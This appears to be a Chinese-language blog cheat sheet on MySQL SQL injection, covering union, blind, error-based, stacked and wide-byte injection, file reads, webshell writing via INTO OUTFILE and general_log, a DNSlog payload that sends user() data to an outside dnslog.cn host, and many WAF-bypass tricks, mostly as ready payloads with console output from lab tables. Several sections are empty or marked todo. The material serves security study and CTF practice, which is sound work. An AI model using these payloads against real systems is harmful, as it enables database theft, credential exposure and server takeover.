---
title: [Web Security] SQL Injection
description: SQL Injection defination, bypass, harm, protection
author: eclaircy
date: 2024-11-08 16:17:00 +0800
categories: [Web Security, SQLi]
tags: [SQLi]
pin: true
math: true
mermaid: true
---



# SQL注入总结


## **1. SQL注入的起因**

由于服务端没有对用户端的输入进行合理的校验和过滤，用户在输入中注入恶意的sql语句，最终导致服务端将





> **常见的关系型数据库端口**
>
> + mysql：3306
> + sqlserver：1433
> + oracle：1521
> + postgresql：5432
>
> **非关系型数据库**
>
> + redis：6379
> + mongodb：27017
> + memcached：11211



**如果存在sql注入，如何判断不同的数据库？**

根据报错信息

根据不同数据库函数



phpstudy进入mysql命令行：打开bin目录，执行mysql -uroot -p，输入密码即可。



## 2. **SQL注入点方式**



注入点可能在GET请求、POST请求、Cookie、HTTP头的参数中。



## 3. 一般测试步骤

+ **判断有无SQL注入：数字型/字符型**

`?id=1`

`?id='1'`

`?id="1"`

`?id=('1')`

`?id=(('1'))`

`?id=("1")`

`?id=(("1"))`

+ **判断列数：order by**

order by的作用是为了爆出select语句选择了几个字段。例如`select id,username,passwd from users order by 3`表示选择出3列字段，并按照第三个字段进行排序。那么对于这条sql语句，order by后的数字只能>=1且<=3，如果`order by 4`数据库就会报错。

+ **爆数据库**

注意union前后的select语句选择的列数要一致，否则语法错误。

```mysql
select id,username,passwd from users where id='1' union select 1,database(),3-- 
```

或者通过group_concat()爆出全部的数据库名。

```mysql
select id,username,passwd from users where id='1'
union select 1,group_concat(schema_name),3 from information_schema.schemata#
```

+ **爆表**

`desc 表名`可以用于查看表的信息。

```
mysql> desc users;
+----------+--------------+------+-----+---------+----------------+
| Field    | Type         | Null | Key | Default | Extra          |
+----------+--------------+------+-----+---------+----------------+
| Id       | int(11)      | NO   | PRI | NULL    | auto_increment |
| username | varchar(255) | YES  |     | NULL    |                |
| password | varchar(255) | YES  |     | NULL    |                |
+----------+--------------+------+-----+---------+----------------+
3 rows in set (0.00 sec)
```

sql注入获取表名，一个数据库里可能存在多张表，因此可以使用group_concat函数将所有的表名拼接在一起，

```mysql
select id,username,passwd from users where id='1'
union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='数据库名'#
```

或者直接令`table_schema=database()`。

```mysql
select id,username,passwd from users where id='1'
union select 1,group_concat(table_name),3 from information_schema.columns where table_schema=database()--
```

也可以使用`limit i,1`逐个破解表名，i从0开始；`substr(表名,j,1)`逐个破解数据表名的字符，j从1开始。

```mysql
select * from users where id='1' 
and if(substr((select table_name from information_schema.tables where table_schema='数据库名' limit 0,1),1,1)='a',SLEEP(3),1)
```

+ **爆列**

注意爆列时，where子句中需要将table_schema和table_name都作为条件。

```mysql
select id,username,passwd from users where id='1'
union select 1,group_concat(column_name),3 from information_schema.columns where table_schema='数据库名' and table_name='表名'--
```

+ **爆数据**

获得数据库名、表名、列名后，

```mysql
select * from users where id='1' union select 1,group_concat(passwd),3 from 表名
```

```mysql
select * from users where id='1' union select 1,group_concat(0x7e,passwd,0x7e),3 from 表名
```

```mysql
select * from users where id='1' union select 1,concat_ws(0x7e,id,username,passwd),3 from 表名-- 
```



## 4. SQL注入基本类型

### 4.1 盲注

#### 4.1.1 时间盲注

关键函数：sleep()、benchmark()、get_lock()等



**（1）sleep()**

判断注入点

```mysql
select * from users where id='1' and sleep(3)-- 
```

通过时间盲注猜解字符

```mysql
select * from users where id='1' and if(substr(database(),1,1)='a',sleep(3),1)-- 
```

当sleep()被禁用时，还可以尝试通过注入消耗时间和性能的sql语句，达到时间延时的效果。



**（2）benchmark()**

关键函数：benchmark(N,expression)、MD5()、SHA1()

benchmark函数用于重复执行某个语句，N代表要重复执行的次数，expression代表要执行的语句。可以通过benchmark函数进行大量消耗性能的复杂运算，达到时间延时的效果。例如，可以令benchmark重复执行md5、sha1哈希计算数万次。

当执行2000w次SHA1运算，在本地数据库测试次语句后，大约耗时3.6s；执行5000w次时大约需要9s。

```mysql
mysql> select benchmark(20000000,sha1('hello world'));
+-----------------------------------------+
| BENCHMARK(20000000,SHA1('hello world')) |
+-----------------------------------------+
|                                       0 |
+-----------------------------------------+
1 row in set (3.60 sec)
```



**（3）get_lock()**

关键函数：`get_lock(lock_name,timeout)`

注意，必须**不同的mysql session对同一个lock执行get_lock()操作时才会产生时延**，在同一个session中执行多次get_lock()不会产生时延。而且必须要提供长连接mysql_pconnect()。

> mysql_pconnect() 函数打开一个到 MySQL 服务器的持久连接。mysql_pconnect() 和 mysql_connect() 非常相似，但有两个主要区别：
>
> 当连接的时候本函数将先尝试寻找一个在同一个主机上用同样的用户名和密码已经打开的（持久）连接，如果找到，则返回此连接标识而不打开新连接。
>
> 其次，当脚本执行完毕后到 SQL 服务器的连接不会被关闭，此连接将保持打开以备以后使用（mysql_close() 不会关闭由 mysql_pconnect() 建立的连接）。

+ 开启一个mysql session，执行获取锁操作。

```mysql
mysql> select GET_LOCK('lock1',1);
+---------------------+
| GET_LOCK('lock1',1) |
+---------------------+
|                   1 |
+---------------------+
1 row in set (0.00 sec)
```

+ 开启一个新的mysql session，尝试获取该锁，会产生1s时延。假如将第二个参数timeout设置为5，那么会产生5s时延。

```mysql
mysql> select GET_LOCK('lock1',1);
+---------------------+
| GET_LOCK('lock1',1) |
+---------------------+
|                   0 |
+---------------------+
1 row in set (1.00 sec)

mysql> select GET_LOCK('lock1',5);
+---------------------+
| GET_LOCK('lock1',5) |
+---------------------+
|                   0 |
+---------------------+
1 row in set (5.00 sec)
```

+ 最后还可以释放锁。当显式执行`release_lock(lock_name)`或session隐式地过期时，该锁都会被释放。

```
mysql>  select release_lock('lock1');
+-----------------------+
| release_lock('lock1') |
+-----------------------+
|                     1 |
+-----------------------+
1 row in set (0.00 sec)
```



**（4）笛卡尔积盲注**

笛卡尔积能够将多个表合并成一个表，从而达到时间延时的作用。

```
select count(*) from information_schema.columns A, information_schema.columns B, information_schema.tables C
```



```mysql
select * from users where id='1' and (select count(*) from information_schema.columns A, information_schema.columns B, information_schema.tables C
```



**（5）正则DOS**

在本地执行后消耗3s。

```mysql
mysql> select * from users where id='1' and if(mid(user(),1,1)='r',concat(rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a')) RLIKE '(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+cd',1);

Empty set (2.98 sec)
```





#### 4.1.2 布尔盲注

试探是否存在注入，通过页面的回显判断。

```mysql
select * from users where id='1' and 1/1
```

布尔盲注爆数据库名

```mysql
select * from users where id='1' and LEFT(database(),2)='ab'-- 
```

```mysql
select * from users where id='1' and LEFT(database(),2)>'ac'-- 
```

```mysql
select * from users where id='1' and ASCII(substr(database(),1,1))=98-- 
```

也可以用字符的十六进制代替字符串

```mysql
select * from users where id=1 and 0x73=(select(mid(database() from 1 for 1)))
```



#### 4.1.3 布尔/算数运算符号总结

and	&&

or		||

xor	^

not	!

`+`、`-`、`*`、`/`

异或注入的语句如下，当

```mysql
mysql> select * from test where id='1'^(mid(database(),1,1)='a')^1;
Empty set (0.00 sec)
```

```mysql
mysql> select * from test where id='1'^(mid(database(),1,1)='b')^1;
+----+----------+--------------------------+
| Id | username | passwd                 |
+----+----------+--------------------------+
|  1 | admin    | ctfshow{123333333333333} |
+----+----------+--------------------------+
1 row in set (0.00 sec)
```





### 4.2 SQL读写文件

#### 4.2.1 读取文件

关键函数：`load_file()`

**（1）盲注逐字符读取文件**

```mysql
select * from test where id=1 and substr((select load_file('D:\\test.txt')),1,1)='t'
```



**（2）报错注入扫描文件是否存在**

select load_file()如果文件不存在时，结果为NULL，不会报错。

load_file()可以和报错注入结合，扫描文件是否存在。以下sql语句当文件存在时返回1，不存在时返回0。

```mysql
select * from test where id='1' and updatexml(1,concat(0x7e,(select NOT ISNULL(load_file('D:\\20242272.php'))),0x7e),1)
```

```
ERROR 1105 (HY000): XPATH syntax error: '~1~'
```



#### 4.2.2 写文件

关键函数：`into outfile `

==利用条件==：知道网站目录的绝对路径；有写文件的权限；

危害：可以用于写webshell、写定时任务，从而执行命令。

**（1）查看MYSQL写文件的权限**

当secure_file_priv为NULL时，数据库不允许写文件；当secure_file_priv的值为空时，可以向任意路径写文件。

```mysql
mysql> select @@global.secure_file_priv;
+---------------------------+
| @@global.secure_file_priv |
+---------------------------+
| D:\                       |
+---------------------------+

mysql> select @@secure_file_priv;
+--------------------+
| @@secure_file_priv |
+--------------------+
| D:\                |
+--------------------+
```

```mysql
mysql> SHOW VARIABLES LIKE '%secure%';
+--------------------------+-------+
| Variable_name            | Value |
+--------------------------+-------+
| require_secure_transport | OFF   |
| secure_auth              | ON    |
| secure_file_priv         | D:\   |
+--------------------------+-------+
```

```mysql
mysql> SHOW VARIABLES LIKE "secure_file_priv";
+------------------+-------+
| Variable_name    | Value |
+------------------+-------+
| secure_file_priv | D:\   |
+------------------+-------+
1 row in set, 1 warning (0.00 sec)
```

也可以通过报错注入获取@@secure_file_priv的值。

```mysql
mysql> select * from users where id=1 and updatexml(1,concat(0x7e,(select @@secure_file_priv),0x7e),1);
ERROR 1105 (HY000): XPATH syntax error: '~D:\~'
```



**（2）sql注入写文件**

+ 作用1：无回显数据外带

当sql注入无回显时，除了dnslog外带数据，还可以利用`union select ... into outfile`将信息写入到服务器的文件，再查看此文件。

```mysql
?id=1 union select 1,2,version() into outfile '/var/www/html/mysql_version.txt'
```



+ 作用2：写webshell

```mysql
?id=1 union select 1,2,'<?php phpinfo();?>' into outfile '/var/www/html/shell.php'
```



+ 作用3：写定时任务





**（3）starting/terminated by**

关键函数：`fields terminated by`、`lines terminated by`、`lines starting by `

`fields terminated by [str]`的含义是在select出的每列字段的末尾添加字符串。但需要注意，如果表中没有数据，那么文件中永远不会被写入任何内容；如果表中只有一列，或者只select一列，那么无法将字符串写入到文件中。其中`0x3c3f70687020706870696e666f28293b3f3e`是`<? php phpinfo();?>`的十六进制形式。

```mysql
select * from users where id='1' INTO OUTFILE 'D:\\shell.php' fields terminated by 0x3c3f70687020706870696e666f28293b3f3e
```

当users表中总共有3列字段，那么在写入的文件中内容如下。

```
1<?php phpinfo();?>admin<?php phpinfo();?>ctfshow{123}
```

`lines terminated by`是在每行记录的末尾添加字符串。

```mysql
select * from users where id='1' INTO OUTFILE 'D:\\shell.php' LINES TERMINATED by  0x3c3f70687020706870696e666f28293b3f3e
```

`lines starting by `

```mysql
select * from users where id='1' INTO OUTFILE 'D:\\shell.php' LINES STARTING by 0x3c3f70687020706870696e666f28293b3f3e
```



**（4）dumpfile**

```mysql
SELECT hex(load_file('/lib_mysqludf_sys_64.so')) into dumpfile '/tmp/udf.txt'; 

SELECT hex(load_file(0x2f6c69625f6d7973716c7564665f7379735f36342e736f)) into dumpfile '/tmp/udf.txt';
```



**（5）日志文件写shell**

查看全局变量general_log和general_log_file。

```mysql
mysql> show variables like '%general%';
+------------------+--------------------------------------------------------------------------+
| Variable_name    | Value                                                                    |
+------------------+--------------------------------------------------------------------------+
| general_log      | OFF                                                                      |
| general_log_file | D:\phpStudy\phpstudy_pro\Extensions\MySQL5.7.26\data\LAPTOP-AFKN60T3.log |
+------------------+--------------------------------------------------------------------------+
```

+ 开启general log模式

```mysql
set global general_log=on;
```

+ 设置general_log_file为shell.php

```mysql
set global general_log_file='D:\\shell.php';
```

+ select恶意字符串，即可写入木马。

```mysql
select '<?php phpinfo();?>';
```

+ 查看general_log_file文件，可见其中包含我们注入的恶意sql语句。

```
D:\phpStudy\phpstudy_pro\COM\..\Extensions\MySQL5.7.26\\bin\mysqld.exe, Version: 5.7.26 (MySQL Community Server (GPL)). started with:
TCP Port: 3306, Named Pipe: MySQL
Time                 Id Command    Argument
2024-02-27T14:10:46.528834Z	   28 Query	show variables like '%general%'
2024-02-27T14:11:22.110164Z	   28 Query	select '<?php phpinfo();?>'
```





**报错注入写webshell**

报错注入查看mysql写文件权限





### 4.3 报错注入

mysql可以利用xpath语法错误进行报错注入。

**（1）extractvalue()**

关键函数：`extractvalue(1,[要执行的SQL语句])`

在下列语句中，`0x7e`即为`~`。

```mysql
select * from users where id=1 
and extractvalue(1,concat(0x7e,database(),0x7e))-- 
```

```mysql
select * from users where id=1 
and extractvalue(1,concat(0x7e,(select @@version_compile_os),0x7e))-- 
```

+ 爆库

extract_value()函数报错显示的字符有长度限制，因此可以使用`limit [offset] [rows]`，将[offset]从0遍历到最大即可获取全部数据库名。

```mysql
select * from users where id=1 and extractvalue(1,concat(0x7e,database(),0x7e))-- 
```

```mysql
select * from users where id=1 and extractvalue(1,concat(0x7e,(select schema_name from information_schema.schemata limit 0,1),0x7e))-- 
```

+ 爆表

```mysql
select * from users where id=1 and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='数据库名' limit 0,1),0x7e))-- 
```

+ 爆列

```mysql
select * from users where id=1 and extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_schema='数据库名' and table_name='表名' limit 0,1),0x7e))-- 
```

+ 爆字段

通过`concat(id,'~',username,'~',passwd)`，可以按照对应关系爆出id、username、passwd字段值。

```mysql
select * from users where id=1
and extractvalue(1,concat(0x7e,(select concat(id,0x7e,username,0x7e,passwd) from 数据库名.表名 limit 0,1),0x7e))-- 
```

数据库中往往存在多条字段，可以通过`limit n,1`逐条爆出。

如果字段过长，可以使用`substr([offset],[length])`、`substring()`截取字符串。例如在如下SQL注入语句中，`substr(..,1,10)`的含义是从第一个字符开始截取10个字符。

```mysql
select * from users where id=1 
and extractvalue(1,concat(0x7e,substr((select passwd from 数据库名.表名 limit 0,1),1,10),0x7e))-- 
```



**（2）updatexml()**

和extractvalue()的区别在于updatexml()需要3个参数，格式为`updatexml(1,[要执行的SQL语句],1)`

```mysql
select * from users where id=1
and updatexml(1,concat(0x7e,database(),0x7e),1)-- 
```



**（3）整数溢出报错**

+ 关键函数：exp()、pow()、cot()

```mysql
mysql> select * from test where id='1' and cot(0);
ERROR 1690 (22003): DOUBLE value is out of range in 'cot(0)'
```

```mysql
mysql> select * from test where id='1' and pow(99999,99999);
ERROR 1690 (22003): DOUBLE value is out of range in 'pow(99999,99999)'
```

`exp()=e^x`，用于计算e的x次幂。当exp()的参数为710时才开始报错，如果小于710只会返回正常的查询结果。

```mysql
mysql> select * from test where id='1' and exp(710);
ERROR 1690 (22003): DOUBLE value is out of range in 'exp(710)'
```



**（4）几何函数报错**

`polygon()`可以用于爆出当前数据库名、表名、列名。

```
select * from test where id='1' and polygon(id);
```

```
ERROR 1367 (22007): Illegal non geometric '`bihu`.`test`.`Id`' value found during parsing
```

`linestring()`

```
select * from test where id='1' and linestring(id);
```

```
ERROR 1367 (22007): Illegal non geometric '`bihu`.`test`.`Id`' value found during parsing
```





**（5）floor()**

https://blog.csdn.net/miraclehw/article/details/129250360

https://www.cnblogs.com/hsk832/p/14651018.html



**（6）列名重复报错**

+ 关键函数：`name_const()`

https://www.cnblogs.com/linuxsec/articles/11107102.html



+ JOIN

首先要知道表名，用join爆出第一列的列名。

```mysql
mysql> SELECT * FROM (SELECT * FROM users AS a JOIN users b)c
ERROR 1060 (42S21): Duplicate column name 'Id'
```

得到第一列的列名后，在语句的基础上添加`using(第一列名)`爆出第二列的列名。

```
mysql> SELECT * FROM (SELECT * FROM users AS a JOIN users b USING(id))c
ERROR 1060 (42S21): Duplicate column name 'username'
```

得到第一列、第二列的列名后，继续用`using(第一列，第二列)`爆出第三列的列名。

```mysql
mysql> SELECT * FROM (SELECT * FROM users AS a JOIN users b USING(id,username))c
ERROR 1060 (42S21): Duplicate column name 'password'
```

不断将所有得到的列名添加到using函数中，当所有的列都被添加后，数据库不再报错，得到的结果是该表中的全部数据。

```mysql
mysql> SELECT * FROM (SELECT * FROM users AS a JOIN users b USING(id,username,`password`))c
+----+----------+------------+
| id | username | `password`   |
+----+----------+------------+
|  1 | Dumb     | Dumb       |
|  2 | Angelina | I-kill-you |
+----+----------+------------+
```



**（7）短路原则与报错注入**

https://www.cnblogs.com/linuxsec/articles/11107102.html

SQL语句中语法存在错误时，短路原则并不会阻止报错。`and 1=1`和`and 1=0`

```mysql
select * from test where id='1' and 1=1 and updatexml(1,concat(0x7e,(select database()),0x7e),1)
```

```mysql
select * from test where id='1' and 1=0 and updatexml(1,concat(0x7e,(select database()),0x7e),1)
```



### 4.4 二次注入





### 4.5 堆叠注入

例如，当注入类型为GET时，可能的payload如下：

```mysql
?id=1;show tables#
```

```mysql
id=1;show columns from 表名#
```



```mysql
';use information_schema;set @sql=concat('s','elect column_name from columns wher','e table_name="1919810931114514"');prepare stmt1 from @sql;execute stmt1;
```





### 4.6 宽字节注入

利用条件：

	1. 使用addslashes()函数 
	2. 数据库采用GBK编码 

当数据库采用GBK编码时，将两个字节视为一个汉字。

输入`%df'`，`addslashes()`会在`'`前添加转义符号`\`，从而变成`%df\'`，即URL编码中的`%df%5c%27`。而数据库采用GBK编码，会认为`%df%5c`是一个汉字`縗`的编码，最后的单引号`'`从而进行了逃逸。



### 4.7 dnslog注入



```mysql
select * from users where id = '1' and (select load_file(concat('\\',(select hex(user())),'xxx.dnslog.cn')))
```





### 4.8 insert/update/delete注入

+ 报错注入

```mysql
INSERT INTO users(`username`,`password`) 
VALUE('1' OR updatexml(1,concat(0x7e,(select database()),0x7e),1),'2')
```



```mysql
UPDATE users SET `password` '123' where id='1' and updatexml(1,concat(0x7e,database(),0x7e),1)
```



```mysql
DELETE from users where id='1' and updatexml(1,concat(0x7e,database(),0x7e),1)
```





## 5. SQL注入绕过技巧

### 5.1 字符串猜解总结

字符判断方式：`> < =`；`between and`；`like/rlike`；`strcmp`；`order by`；

字符截取方式：`substr/substring`、`mid`、`left/right`、

字符编码方式：`hex/unhex`、`ord`、`ascii`、

**（1）字符判断比较方式**

+ **通过比较符号判断**

​		直接通过=进行比较。

```mysql
select * from users where id='1' and if(substr(database(),1,1)='a',sleep(3),1)-- 
```

​		还可以通过`>=` 、`<=`符号判断字符范围，结合二分法快速确定字符的值。

```mysql
select * from users where id='1' and 
if(substr((select table_name from information_schema.tables where table_schema='数据库名' limit 1,1),1,1)>='k',SLEEP(3),1)-- 
```

```mysql
select * from users where id='1' and 
if(ASCII(substr((select table_name from information_schema.tables where table_schema='数据库名' limit 1,1),1,1))>112,SLEEP(3),1)-- 
```

+ **通过between and判断**

​		`BETWEEN 'a' and 'c'`判断字符是否在a到c之间。

```mysql
select * from users where id='1' and substr(database(),1,1) BETWEEN 'a' and 'c'
```

+ 通过like/rlike判断
+ 通过strcmp判断
+ **【技巧】order by大小比较盲注猜解字符**

条件：未过滤union select、未过滤order by

靶场：ctfshow web691



```mysql
select id,username,passwd from users where id='1' union select 1,2,'a' order by 3
```

 

```
mysql> select id,`username`,`password` from users where id='1' union select 1,2,'c' order by 3;
+----+----------+--------------------------+
| id | username | password                 |
+----+----------+--------------------------+
|  1 | 2        | c                        |
|  1 | admin    | ctfshow{123333333333333} |
+----+----------+--------------------------+
2 rows in set (0.00 sec)

mysql> select id,username,`password` from users where id='1' union select 1,2,'d' order by 3;
+----+----------+--------------------------+
| id | username | password                 |
+----+----------+--------------------------+
|  1 | admin    | ctfshow{123333333333333} |
|  1 | 2        | d                        |
+----+----------+--------------------------+
2 rows in set (0.00 sec)
```



### 

**（2）字符截取方式**

+ **通过left/right函数截取**

​		`left(str,n)`截取字符串的前n个字符。

```mysql
select * from users where id='1' and 
if(LEFT((select table_name from information_schema.tables where table_schema='数据库名' limit 0,1),2)='te',SLEEP(3),1)
```

+ **通过mid函数截取**

==todo==

```
select * from users where id='1' and mid(database(),1,1)=
```

+ 通过substr/subtring截取



**（3）字符编码方式**

+ **通过ASCII编码**

​		关键函数：`ord()`、`ascii()`

```mysql
select * from users where id='1' and if(ord(substr(database(),1,1))=98,SLEEP(3),1)-- 
```

```mysql
select * from users where id='1' and if(ASCII(substr(database(),1,1))=98,SLEEP(3),1)-- 
```



+ **通过16进制编码**





### 5.2 绕过空格

**（1）注释绕过空格**

mysql有4种注释：单行注释`-- `、单行注释`#`、多行注释`/**/`、内联注释`/*!*/`

+ 多行注释`/**/`

可以使用多行注释符号绕过空格`/**/`。	

```mysql
select * from users where id='1'union/**/select/**/1,2,user()/**/from/**/test
```

+ 内联注释`/*!*/`

内联注释里的内容可以被mysql解析，会被当成正常语句的一部分被执行。也就是说，mysql语句的任意部分都能被内联注释包裹且正常执行。但关键词不能被拆分，例如`/*!sel*/ect`是不合法的。当在内联注释中指定版本号时，代表只有当前mysql版本号大于该版本号时，后面的语句才会执行，如`CREATE database db /*!40100 DEFAULT CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci*/`。

内联注释绕过and关键字：`/*!11444and*/`

内联注释绕过union select关键字：	

```mysql
/*!union*//*!select*/
union/*!11440 select*/
union/*!11440select*/
union/*!77777cz*//*!77777cz*/select	
```

*内联注释绕过函数：*

可以在函数名和括号直接添加内联注释`/*!77777a*/`绕过检测。例如，可以用`database/*!77777a*/()`绕过database()关键字。

注意，user()可以用`user/*!77777cz*/()`绕过，但session_user()不能`session_user/*!77777cz*/()`，否则语法报错，只能`/*!11440session_user()*/`。



**（2）括号绕过空格**

```mysql
select(COUNT(*))from(users)where(id)=0 and 1=1
```

```mysql
select*from(users)where(id)=(1)and(1=1) 
```

```mysql
select * from users where id=1 union/**/select(1),2,database()
select * from users where id='1'union/**/select(database()),2,3
```

union select不能加括号，否则会报错。

```mysql
select * from users where(id)='1'union select(group_concat(table_name)),2,(3)from(information_schema.tables)where(table_schema=database())
```



**（3）空白字符绕过空格**

`%0a`、`%0b`、`%0c`、`%0d`、`%a0`空格、`%20`、`%09`TAB键、`%00`截断符

可以用于绕过对函数关键词紧跟括号的检测，WAF可能对`database()`字符设置黑名单，用各种空白字符隔开关键词和括号可能会绕过检测，如`database%0a()`、`union%0bselect`，。

**（4）反引号绕过空格**

可以给表名和字段名加上反引号，从而绕过空格。

```mysql
select(COUNT(*))from`users`where`id`=1
```



### 5.2 绕过引号

当引号被过滤时，可以将**字符串转为十六进制**绕过。例如admin的十六进制为0x61646D696E，可以用`select * from users where username=0x61646D696E`代替``select * from users where username='admin'`。



### 5.3 绕过比较符号

可以使用greatest()获取多个参数中的最大值，least()获取多个参数中的最小值。

```mysql
select * from users where id=1 and greatest(ascii(substr(database(),0,1)),64)=64
```

当**等于号**被过滤时，还可以用`regexp()`、`like()`、`rlike()`、`between and`、`locate()`、`position()`、`instr()`查询字符串。

```mysql
select * from users where id='1' and if(position('root' IN substrING(user(),1,4))>0,1,0)
```

```mysql
select * from users where id='1'and if(locate('root',substrING(user(),1,4))>0,1,0)
```

```mysql
select * from users where id='1'and if(instr('root',substrING(user(),1,4))>0,1,0)
```



### 5.4 绕过逗号

+ from for 绕过

使用`from 1 for 1` 绕过 `substr(str,1,1)`

```mysql
select substr(database() from 1 for 1)
```

```mysql
select mid(database() from 1 for 1)
```

```mysql
select mid(database()from(1)for(1))
```

+ limit offset绕过

使用`limit 1 offset 0` 绕过 `limit 0,1`

```mysql
select * from users limit 1 offset 0
```

+ join绕过

使用`union select * from (select 3)a join (select 4)b` 代替 `union select 3,4`

```mysql
select 1,2 from users union select * from (select 3)a join (select 4)b
```



### 5.5 绕过union select相关

+ 添加all/distinct关键字

如果只针对union select关键字设置黑名单，那么可以尝试在select前添加其他关键字绕过。

```mysql
union all select
union distinct select
```

+ 内联注释绕过union select关键字

```mysql
/*!union*//*!select*/
union/*!11440 select*/
union/*!11440select*/
union/*!77777cz*//*!77777cz*/select
```

```
mysql> select * from users where id='1' and 0 /*!union*//*!select*/1,2,user();
+----+----------+--------------------------+
| Id | username | password                 |
+----+----------+--------------------------+
|  1 | 2        | root@localhost           |
+----+----------+--------------------------+
```

+ ==花括号绕过？？这能绕过什么==

花括号内的`x`可以为任意字符串，但不能为纯数字。

```mysql
select * from users where id='1' union select {xxx 1},{xxx 2},user()
```

+ 换行+垃圾字符绕过

```
id=1 union 
/*
ae
s
d
z
w
...
*/
select 1,user()--+
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/5209c2b81a2d462eaa0f8b63fb7c61d4.png)





### 5.5 绕过order by

**关键函数：select ... into @a,@b,@c**

**目的：猜解列的数量**

当order by被过滤时，可以用`select ... into @a,@b,`猜解列数量。当有3列时，只有`into @a,@b,@c`才能正常执行，如果变量小于或大于3都会报错The used select statements have a different number of columns。

```mysql
select * from users where id=1 INTO @a,@b,@c
```

```
mysql> select * from test where id=1 INTO @a,@b,@c;
Query OK, 1 row affected (0.00 sec)

mysql> select * from test where id=1 INTO @a,@b;
ERROR 1222 (21000): The used select statements have a different number of columns

mysql> select * from test where id=1 INTO @a,@b,@c,@d;
ERROR 1222 (21000): The used select statements have a different number of columns
```





### 5.7 绕过information shema

https://blog.csdn.net/qq_43936524/article/details/116796087

当information shema被禁止时，

用database()获取当前数据库名；

用innoDB引擎注入获取

获取表名；

用列重复报错获取列名；用无列名注入获取数据；

**（1）Innodb引擎注入**

当mysql版本大于5.6时，数据库`mysql`存在`innodb_index_stats` 和 `innodb_table_stats`表，用于保存数据库最近的变动记录。当information_schema被禁止时，可以用此方式。

```mysql
mysql> select * from users where id='1' union select 1,2,group_concat(table_name) from mysql.innodb_table_stats where database_name=database();
+----+----------+--------------------------+
| Id | username | password                 |
+----+----------+--------------------------+
|  1 | admin    | ctfshow{123333333333333} |
|  1 | 2        | test                     |
+----+----------+--------------------------+
2 rows in set (0.01 sec)
```



```mysql
mysql> select group_concat(table_name) from mysql.innodb_index_stats where database_name=database();
+--------------------------+
| group_concat(table_name) |
+--------------------------+
| test,test,test           |
+--------------------------+
1 row in set (0.01 sec)
```



**（2）**



### 5.8 绕过列名-无列名注入

**前提：已知表名，未知列名。**

11、22、33是给原本的列名分别起的别名，需要用反引号包裹，否则会被视为纯数字；如果起字符型的别名则不需要。

```mysql
mysql> select `33` from (select 11,22,33 union select * from users)AS X;
+-----------------------------------------------+
| 33                                            |
+-----------------------------------------------+
| 33                                            |
| ctfshow{2a0dca32-e5de-4f6c-8a85-2d325d89dbf8} |
| passw@rd                                      |
| passw0rd                                      |
+-----------------------------------------------+

mysql> SELECT column2 FROM (SELECT 11,'column2',33 UNION SELECT * FROM users)x;
+---------+
| column2 |
+---------+
| column2 |
| admin   |
| user1   |
| user2   |
+---------+
```

无列名sql注入语句如下所示。

```mysql
mysql> SELECT * FROM users WHERE id='1' UNION SELECT 1,2,`33` FROM (SELECT 11,22,33 UNION SELECT * FROM users)x;
+----+----------+-----------------------------------------------+
| Id | username | password                                      |
+----+----------+-----------------------------------------------+
|  1 | admin    | ctfshow{2a0dca32-e5de-4f6c-8a85-2d325d89dbf8} |
|  1 | 2        | 33                                            |
|  1 | 2        | ctfshow{2a0dca32-e5de-4f6c-8a85-2d325d89dbf8} |
|  1 | 2        | passw@rd                                      |
|  1 | 2        | passw0rd                                      |
+----+----------+-----------------------------------------------+
```

注意，最外层select的列名必须和内层select的自定义列名一致，否则报错。因为如下表所示，把`select 11,22,33`放在`union select * from users`之前，最终查询结果表的3个列名为我们自定义的列名11、22、33。

```
mysql> select 11,22,33 union select * from users;
+----+-------+-----------------------------------------------+
| 11 | 22    | 33                                            |
+----+-------+-----------------------------------------------+
| 11 | 22    | 33                                            |
|  1 | admin | ctfshow{2a0dca32-e5de-4f6c-8a85-2d325d89dbf8} |
|  2 | user1 | passw@rd                                      |
|  3 | user2 | passw0rd                                      |
+----+-------+-----------------------------------------------+

mysql> select * from users union select 11,22,33;
+----+----------+-----------------------------------------------+
| Id | username | password                                      |
+----+----------+-----------------------------------------------+
|  1 | admin    | ctfshow{2a0dca32-e5de-4f6c-8a85-2d325d89dbf8} |
|  2 | user1    | passw@rd                                      |
|  3 | user2    | passw0rd                                      |
| 11 | 22       | 33                                            |
+----+----------+-----------------------------------------------+
```



### 5.9 绕过WAF-填充大量字符

联合注入时可以select大量垃圾字符，绕过WAF的检测。注入id=1  and 1=0 union select，结果只会显示union之后select的结果，因为第一个select被注入了and 0，不会显示结果。

```mysql
select * from users where id=1 and (select 1)=(select 0xAAAAAAAAAAAAAAAAAAAAAA)union select 1,2,user()
```

```
mysql> select * from test where id=1 and (select 1)=(select 0xAAAAAAAAAAAAAAAAAAAAAA)union select 1,2,user();
+----+----------+----------------+
| Id | username | password       |
+----+----------+----------------+
|  1 | 2        | root@localhost |
+----+----------+----------------+
1 row in set, 1 warning (0.00 sec)
```





### 5.10 绕过WAF-HTTP编码绕过

当服务器支持识别的编码比WAF更多时，可以尝试将HTTP数据的编码类型转换为服务器可以识别，而WAF不能识别的编码。例如，可以将数据用IBM500进行编码，修改`Content-Type: charset=ibm500;`。可以查询各种类型的服务器支持的编码类型。

![在这里插入图片描述](https://img-blog.csdnimg.cn/4b1d6487e26645ecaaba7b79b17e676b.png)





## 6. MYSQL关键数据表/函数/变量总结

**信息收集：**

system_user()		 系统用户名

user()							用户名

current_user() 		   当前用户名

session_user()		 连接数据库的用户名

database() 				 数据库名

version() 					mysql数据库版本

load_file()				 mysql读取本地文件的函数

@@datadir 			  读取数据库路径

@@basedir			   mysql 安装路径

@@version_compile_os 	操作系统



**爆多条数据：**

group_concat()

concat_ws(separator, str1, str2, …)							     将多个字符串连接成一个字符串，分隔符可以一次性指定

concat(str1, seperator, str2, seperator, …)					将多个字符串连接成一个字符串，但分隔符号要分别指定



**报错注入：**





**等价函数**

==strcmp()==

```
hex()、bin() <==> ascii()
sleep() ==>benchmark()
concat_ws()==>group_concat()
mid()、substr() ==> substring()
